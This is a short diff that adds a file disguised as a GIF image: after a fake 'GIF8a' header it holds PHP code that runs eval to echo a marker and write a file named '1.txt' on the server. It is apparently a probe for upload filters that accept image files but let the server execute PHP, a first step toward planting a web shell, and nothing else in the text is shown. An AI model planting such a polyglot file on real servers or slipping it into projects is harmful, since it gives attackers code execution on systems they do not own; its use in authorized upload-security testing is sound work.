@@ -1,0 +1,2 @@
+GIF8a
+<?php @eval("echo 11;");eval("file_put_contents('1.txt', 11);");?>
